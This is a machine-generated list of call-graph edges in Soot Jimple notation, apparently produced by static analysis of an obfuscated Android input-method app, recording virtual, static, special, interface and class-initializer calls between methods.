INTERFACE edge: $r1 = interfaceinvoke $r5.<java.util.Map$Entry: java.lang.Object getKey()>() in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getKey()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lta: boolean equals(java.lang.Object)> ==> <lta: boolean equals(java.lang.Object)>
VIRTUAL edge: $r1 = virtualinvoke $r2.<java.lang.Class: java.lang.String getName()>() in <ojg: void h(java.lang.Throwable)> ==> <java.lang.Class: java.lang.String getName()>
SPECIAL edge: specialinvoke $r5.<java.util.ConcurrentModificationException: void <init>()>() in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <java.util.ConcurrentModificationException: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r3.<lsz: boolean equals(java.lang.Object)>($r14) in <lsd: boolean b(lsr)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
STATIC edge: $l1 = staticinvoke <j$.util.concurrent.ThreadLocalRandom: long e(long)>($l1) in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <j$.util.concurrent.ThreadLocalRandom: long e(long)>
STATIC edge: $r6 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i4) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <ojg: void v(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(3) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
STATIC edge: $r22 = staticinvoke <bel: java.io.InputStream a(java.nio.ByteBuffer)>($r21) in <hbw: java.lang.Object a(java.lang.Object)> ==> <bel: java.io.InputStream a(java.nio.ByteBuffer)>
STATIC edge: staticinvoke <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>($r1, "metadata value") in <lsn: void q(lsz,java.lang.Object)> ==> <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r0.<java.lang.String: int length()>() in <ivw: boolean B(java.lang.String)> ==> <java.lang.String: int length()>
SPECIAL edge: $i0 = specialinvoke $r2.<lvr: int b()>() in <lvr: void <init>(lvr,lvr)> ==> <lvr: int b()>
VIRTUAL edge: $r4 = virtualinvoke $r0.<androidx.lifecycle.ProcessLifecycleOwnerInitializer: android.net.Uri insert(android.net.Uri,android.content.ContentValues)>(null, null) in <dummyMainClass: androidx.lifecycle.ProcessLifecycleOwnerInitializer dummyMainMethod_androidx_lifecycle_ProcessLifecycleOwnerInitializer(android.content.Intent)> ==> <androidx.lifecycle.ProcessLifecycleOwnerInitializer: android.net.Uri insert(android.net.Uri,android.content.ContentValues)>
SPECIAL edge: specialinvoke $r6.<java.util.NoSuchElementException: void <init>()>() in <j$.util.concurrent.d: java.lang.Object next()> ==> <java.util.NoSuchElementException: void <init>()>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljd: java.lang.Object j()>() in <ljd: int f(java.lang.Object)> ==> <ljd: java.lang.Object j()>
SPECIAL edge: specialinvoke r0.<lma: void <init>()>() in <lqn: void <init>(lkx,java.lang.Object[],int,int)> ==> <lma: void <init>()>
STATIC edge: $r1 = staticinvoke <lme: lma l(java.util.Comparator)>(null) in <lme: void <init>(lkx,int)> ==> <lme: lma l(java.util.Comparator)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lid: boolean equals(java.lang.Object)>
VIRTUAL edge: $i6 = virtualinvoke $r3.<java.lang.Object: int hashCode()>() in <lma: lma i(int,java.lang.Object[])> ==> <java.util.AbstractSet: int hashCode()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.l)>($i0, $r1, $r2, $r3) in <j$.util.concurrent.s: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.s,j$.util.concurrent.s)> ==> <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.l)>
STATIC edge: $i3 = staticinvoke <izw: int ad(java.lang.Object)>($r2) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <izw: int ad(java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.StringBuilder: java.lang.String toString()>() in <ivv: ivw a()> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lsv: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.String: int hashCode()>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r1) in <ljf: java.lang.Object p()> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $r4 = virtualinvoke r0.<ljd: int[] w()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: int[] w()>
VIRTUAL edge: $r12 = virtualinvoke $r3.<lmb: lme f()>() in <hbv: void j()> ==> <lmb: lme f()>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(9) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
VIRTUAL edge: virtualinvoke r0.<lkh: int b(java.lang.Object[],int)>($r1, 0) in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lqr: int b(java.lang.Object[],int)>
STATIC edge: $r0 = staticinvoke <iye: java.lang.String r(java.lang.String,java.lang.Object[])>($r0, $r2) in <iye: void D(boolean,java.lang.String,int,int)> ==> <iye: java.lang.String r(java.lang.String,java.lang.Object[])>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <lsp: boolean equals(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r6) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <java.lang.Enum: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" cannot be negative but was: ") in <izw: void as(int,java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lid: void <init>()> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r2.<idq: void <init>(java.lang.String,mag)>($r0, $r1) in <idq: idq a(java.lang.String,mag)> ==> <idq: void <init>(java.lang.String,mag)>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lje: java.lang.Object next()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lrg: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <kzs: boolean d(java.lang.Object,java.lang.Object)> ==> <java.util.AbstractMap: boolean equals(java.lang.Object)>
CLINIT edge: staticinvoke <java.lang.Integer: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.Integer: void <clinit>()>
SPECIAL edge: $r2 = specialinvoke r0.<ljf: int[] r()>() in <ljf: void j(int,java.lang.Object,int,int)> ==> <ljf: int[] r()>
STATIC edge: $r4 = staticinvoke <kes: java.lang.String k(nfe)>($r27) in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <kes: java.lang.String k(nfe)>
SPECIAL edge: $r2 = specialinvoke r0.<ljf: java.lang.Object[] s()>() in <ljf: void l(int)> ==> <ljf: java.lang.Object[] s()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lrg: int hashCode()> ==> <lkq: int hashCode()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <lkq: int hashCode()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lkh: lkq k()>() in <lqr: lsa l()> ==> <lma: lkq k()>
VIRTUAL edge: virtualinvoke $r3.<lli: void c(java.util.Map$Entry)>($r6) in <hbv: void j()> ==> <lli: void c(java.util.Map$Entry)>
SPECIAL edge: specialinvoke r0.<android.app.Application: void <init>()>() in <com.google.android.apps.inputmethod.libs.framework.core.AppBase: void <init>()> ==> <android.app.Application: void <init>()>
STATIC edge: staticinvoke <ojg: void h(java.lang.Throwable)>($r0) in <ojg: void v(java.lang.String)> ==> <ojg: void h(java.lang.Throwable)>
VIRTUAL edge: virtualinvoke $r14.<lkl: void h(java.lang.Object)>($r15) in <hbw: java.lang.Object a(java.lang.Object)> ==> <lkl: void h(java.lang.Object)>
STATIC edge: staticinvoke <ojg: void d(java.lang.Object,java.lang.String)>($r0, "<this>") in <nvw: void j(int[],int[],int,int,int)> ==> <ojg: void d(java.lang.Object,java.lang.String)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(45) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lsh: lse h(java.util.logging.Level)>($r2) in <lsh: lsw a(java.util.logging.Level)> ==> <lsh: lse h(java.util.logging.Level)>
INTERFACE edge: $z0 = interfaceinvoke $r10.<java.util.Iterator: boolean hasNext()>() in <hbv: void j()> ==> <lsb: boolean hasNext()>
SPECIAL edge: specialinvoke $r2.<lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)>($r0, $r1, 0, 0) in <lsz: lsz c(java.lang.String,java.lang.Class)> ==> <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Collection: java.lang.Object[] toArray()>() in <izw: java.lang.Object[] S(java.lang.Iterable)> ==> <java.util.ArrayList: java.lang.Object[] toArray()>
SPECIAL edge: specialinvoke r0.<lsz: void <init>(java.lang.String,java.lang.Class,boolean)>("tags", $r1, 0) in <lsk: void <init>(java.lang.Class)> ==> <lsz: void <init>(java.lang.String,java.lang.Class,boolean)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r4) in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r6) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <lvt: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <lqr: int hashCode()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <qj: int b(java.lang.Object)> ==> <java.lang.String: int hashCode()>
SPECIAL edge: $i0 = specialinvoke r0.<ljf: int n()>() in <ljf: java.util.Set f()> ==> <ljf: int n()>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Map$Entry: java.lang.Object getKey()>() in <lli: void c(java.util.Map$Entry)> ==> <ljb: java.lang.Object getKey()>
STATIC edge: $i1 = staticinvoke <lma: int e(int)>($i5) in <lma: lma i(int,java.lang.Object[])> ==> <lma: int e(int)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.Object: int hashCode()>
STATIC edge: $i2 = staticinvoke <izw: int ag(int,int,int)>($i2, 0, $i1) in <ljd: void r(int,java.lang.Object,java.lang.Object,int,int)> ==> <izw: int ag(int,int,int)>
STATIC edge: $r0 = staticinvoke <java.util.TimeZone: java.util.TimeZone getTimeZone(java.lang.String)>($r1) in <j$.util.DesugarTimeZone: java.util.TimeZone getTimeZone(java.lang.String)> ==> <java.util.TimeZone: java.util.TimeZone getTimeZone(java.lang.String)>
STATIC edge: $i1 = staticinvoke <ql: int a(int[],int,int)>($r1, $i2, 0) in <qj: int j()> ==> <ql: int a(int[],int,int)>
STATIC edge: $z0 = staticinvoke <kzs: boolean d(java.lang.Object,java.lang.Object)>($r1, $r2) in <ljd: int f(java.lang.Object)> ==> <kzs: boolean d(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(6) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
SPECIAL edge: specialinvoke $r0.<ltr: void <init>()>() in <ltr: void <clinit>()> ==> <ltr: void <init>()>
SPECIAL edge: specialinvoke $r3.<java.lang.StringBuilder: void <init>()>() in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.StringBuilder: void <init>()>
STATIC edge: staticinvoke <ojg: void d(java.lang.Object,java.lang.String)>($r0, "array") in <ql: int a(int[],int,int)> ==> <ojg: void d(java.lang.Object,java.lang.String)>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(2) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
SPECIAL edge: specialinvoke $r4.<java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>("segments", class "[Lj$/util/concurrent/o;") in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>
VIRTUAL edge: $z0 = virtualinvoke $r6.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractSet: boolean equals(java.lang.Object)>
SPECIAL edge: $r3 = specialinvoke r0.<j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l[] f()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l[] f()>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljd: java.lang.Object j()>() in <ljd: int z(int,int,int,int)> ==> <ljd: java.lang.Object j()>
SPECIAL edge: specialinvoke $r28.<mag: void <init>(java.lang.String,int,int)>("TENOR_STICKER_SEARCH_METADATA", 28, 28) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lrg: int hashCode()>
STATIC edge: $i0 = staticinvoke <java.lang.Math: int max(int,int)>(4, $i0) in <izw: int ak(int)> ==> <java.lang.Math: int max(int,int)>
INTERFACE edge: $r11 = interfaceinvoke $r6.<java.util.Map$Entry: java.lang.Object getKey()>() in <hbv: void j()> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getKey()>
VIRTUAL edge: $r3 = virtualinvoke r0.<j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l[] e(j$.util.concurrent.l[],j$.util.concurrent.l)>($r3, $r4) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l[] e(j$.util.concurrent.l[],j$.util.concurrent.l)>
STATIC edge: $r10 = staticinvoke <lum: lvt k()>() in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lum: lvt k()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lma: boolean equals(java.lang.Object)>
INTERFACE edge: $r2 = interfaceinvoke $r3.<java.util.Map$Entry: java.lang.Object getKey()>() in <llg: java.lang.Object next()> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getKey()>
SPECIAL edge: specialinvoke $r3.<lvs: void <init>(java.lang.String,int)>("DOUBLE", 3) in <lvs: void <clinit>()> ==> <lvs: void <init>(java.lang.String,int)>
SPECIAL edge: specialinvoke r0.<hbv: boolean o()>() in <hbv: void k(java.lang.Object,boolean)> ==> <hbv: boolean o()>
SPECIAL edge: specialinvoke $r1.<java.util.NoSuchElementException: void <init>()>() in <lnc: java.lang.Object next()> ==> <java.util.NoSuchElementException: void <init>()>
STATIC edge: $z0 = staticinvoke <kzs: boolean d(java.lang.Object,java.lang.Object)>($r2, $r7) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <kzs: boolean d(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lrg: lsa l()>
SPECIAL edge: specialinvoke r0.<lkx: void <init>()>() in <lkf: void <init>()> ==> <lkx: void <init>()>
STATIC edge: $r1 = staticinvoke <izw: java.lang.Object al(int)>($i4) in <ljf: int o(int,int,int,int)> ==> <izw: java.lang.Object al(int)>
VIRTUAL edge: $r5 = virtualinvoke $r2.<lts: java.lang.Object d(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <ltr: java.lang.Object d(lsz)>
VIRTUAL edge: $c1 = virtualinvoke $r0.<java.lang.String: char charAt(int)>(0) in <ivw: boolean F(java.lang.String)> ==> <java.lang.String: char charAt(int)>
STATIC edge: staticinvoke <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>($r1, "level") in <lsn: void <init>(java.util.logging.Level)> ==> <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" component is already registered with a different value.") in <iej: void g(java.lang.String,iec)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.Class: java.lang.String getName()>() in <lwk: int c(java.lang.StackTraceElement[],java.lang.Class,int)> ==> <java.lang.Class: java.lang.String getName()>
STATIC edge: $i6 = staticinvoke <j$.util.concurrent.ThreadLocalRandom: int b()>() in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.ThreadLocalRandom: int b()>
SPECIAL edge: specialinvoke $r5.<j$.util.concurrent.k: void <init>(java.lang.Object,java.lang.Object,j$.util.concurrent.ConcurrentHashMap)>($r1, $r2, $r3) in <j$.util.concurrent.d: java.lang.Object next()> ==> <j$.util.concurrent.k: void <init>(java.lang.Object,java.lang.Object,j$.util.concurrent.ConcurrentHashMap)>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.util.concurrent.atomic.AtomicInteger: int addAndGet(int)>(-1640531527) in <j$.util.concurrent.ThreadLocalRandom: void c()> ==> <java.util.concurrent.atomic.AtomicInteger: int addAndGet(int)>
VIRTUAL edge: $c6 = virtualinvoke $r0.<java.lang.String: char charAt(int)>($i5) in <iwt: char[] s(java.lang.String,char,char,int)> ==> <java.lang.String: char charAt(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Enum: void <init>(java.lang.String,int)>("INSTANCE", 0) in <ldr: void <init>()> ==> <java.lang.Enum: void <init>(java.lang.String,int)>
STATIC edge: $i2 = staticinvoke <java.lang.System: int identityHashCode(java.lang.Object)>(r0) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.System: int identityHashCode(java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<lkq: lsb B()>() in <lqn: lsa l()> ==> <lkq: lsb B()>
SPECIAL edge: specialinvoke r0.<iec: void <init>()>() in <hnq: void <init>()> ==> <iec: void <init>()>
VIRTUAL edge: $i1 = virtualinvoke r0.<lkh: int c()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lkh: int c()>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.util.ArrayList: void <init>()>() in <ivv: void <init>()> ==> <java.util.ArrayList: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <lta: int hashCode()>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r5) in <ivw: ivw d(java.util.Locale)> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
STATIC edge: $r1 = staticinvoke <lri: java.lang.Object[] o(java.lang.Object[],int)>($r1, $i0) in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lri: java.lang.Object[] o(java.lang.Object[],int)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])>($r4, $r5) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])>
STATIC edge: staticinvoke <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>($r4, 0, $r8, 0, $i3) in <lvr: void <init>(lvr,lvr)> ==> <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r4) in <luk: lum a(java.lang.String[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r5.<java.lang.String: void <init>(char[],int,int)>($r4, $i1, $i0) in <nzh: boolean f(ivv)> ==> <java.lang.String: void <init>(char[],int,int)>
INTERFACE edge: $z0 = interfaceinvoke $r2.<java.util.Set: boolean containsAll(java.util.Collection)>($r4) in <lri: boolean j(java.util.Set,java.lang.Object)> ==> <java.util.AbstractCollection: boolean containsAll(java.util.Collection)>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lqo: lsa l()>
CLINIT edge: staticinvoke <java.util.Locale: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.util.Locale: void <clinit>()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <kzs: boolean d(java.lang.Object,java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
INTERFACE edge: interfaceinvoke $r1.<java.util.Map: java.lang.Object put(java.lang.Object,java.lang.Object)>($r2, $r3) in <ljd: java.util.Map m()> ==> <java.util.HashMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
STATIC edge: $r2 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.String: boolean equals(java.lang.Object)>($r4) in <ivw: boolean equals(java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
VIRTUAL edge: $r7 = virtualinvoke $r4.<lts: java.lang.Object e(int)>($i1) in <lsn: boolean ac()> ==> <lsm: java.lang.Object e(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <mly: void <init>(java.lang.Object,java.lang.Object,java.lang.Object)> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r1.<android.view.View: void <init>(android.content.Context)>(null) in <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)> ==> <android.view.View: void <init>(android.content.Context)>
STATIC edge: $r2 = staticinvoke <java.util.Arrays: java.util.List asList(java.lang.Object[])>($r1) in <ose: void <clinit>()> ==> <java.util.Arrays: java.util.List asList(java.lang.Object[])>
VIRTUAL edge: $z0 = virtualinvoke $r4.<nzh: boolean e()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean e()>
SPECIAL edge: specialinvoke $r3.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>("Invalid private use tag, other subtag is not empty") in <ivv: int h()> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: $z0 = staticinvoke <lri: boolean a(java.util.Comparator,java.lang.Iterable)>($r5, $r9) in <lqs: boolean containsAll(java.util.Collection)> ==> <lri: boolean a(java.util.Comparator,java.lang.Iterable)>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <ljd: int[] w()> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
STATIC edge: $r27 = staticinvoke <java.lang.Float: java.lang.Float valueOf(java.lang.String)>($r12) in <hbw: java.lang.Object a(java.lang.Object)> ==> <java.lang.Float: java.lang.Float valueOf(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <hbv: void <init>(java.lang.String)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke r0.<lsc: boolean g(java.util.logging.Level)>($r1) in <lsh: lse h(java.util.logging.Level)> ==> <lsc: boolean g(java.util.logging.Level)>
SPECIAL edge: specialinvoke $r27.<java.lang.AssertionError: void <init>(java.lang.Object)>("Overflow of RecursionDepth (possible error in core library)") in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <java.lang.AssertionError: void <init>(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(4) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l0, $i1, $i2) in <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l[] e(j$.util.concurrent.l[],j$.util.concurrent.l)> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lfb: void <init>(lfa)> ==> <java.lang.Object: void <init>()>
STATIC edge: $z0 = staticinvoke <ivw: boolean B(java.lang.String)>($r6) in <ivw: ivw d(java.util.Locale)> ==> <ivw: boolean B(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r0.<ljd: java.lang.Object[] x()>() in <ljd: java.lang.Object h(int)> ==> <ljd: java.lang.Object[] x()>
VIRTUAL edge: $z2 = virtualinvoke $r2.<j$.sun.misc.b: boolean d(java.lang.Object,long,long,long)>($r3, $l4, $l5, $l3) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.sun.misc.b: boolean d(java.lang.Object,long,long,long)>
STATIC edge: $i3 = staticinvoke <ql: int a(int[],int,int)>($r2, $i2, $i0) in <qj: int i(java.lang.Object,int)> ==> <ql: int a(int[],int,int)>
SPECIAL edge: specialinvoke $r1.<bek: void <init>(java.nio.ByteBuffer)>($r0) in <bel: java.io.InputStream a(java.nio.ByteBuffer)> ==> <bek: void <init>(java.nio.ByteBuffer)>
VIRTUAL edge: $r1 = virtualinvoke r0.<ljd: int[] w()>() in <ljd: void t(int)> ==> <ljd: int[] w()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lkq: int hashCode()>
VIRTUAL edge: $i6 = virtualinvoke $r3.<java.lang.Object: int hashCode()>() in <lma: lma i(int,java.lang.Object[])> ==> <lkq: int hashCode()>
CLINIT edge: staticinvoke <hbw: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <hbw: void <clinit>()>
SPECIAL edge: specialinvoke $r14.<lkt: void <init>(int)>($i0) in <lmb: lme f()> ==> <lkt: void <init>(int)>
SPECIAL edge: specialinvoke $r2.<lin: void <init>(ldp,lqd)>($r1, r0) in <lqd: lqd d(ldp)> ==> <lin: void <init>(ldp,lqd)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lid: java.lang.Object getValue()>() in <lid: boolean equals(java.lang.Object)> ==> <ljb: java.lang.Object getValue()>
STATIC edge: $i2 = staticinvoke <java.lang.Integer: int highestOneBit(int)>($i2) in <lma: int e(int)> ==> <java.lang.Integer: int highestOneBit(int)>
STATIC edge: staticinvoke <iwt: void r(char[],int,int,char,char,int)>($r0, $i0, $i1, 65, 90, 32) in <iwt: void f(char[],int,int)> ==> <iwt: void r(char[],int,int,char,char,int)>
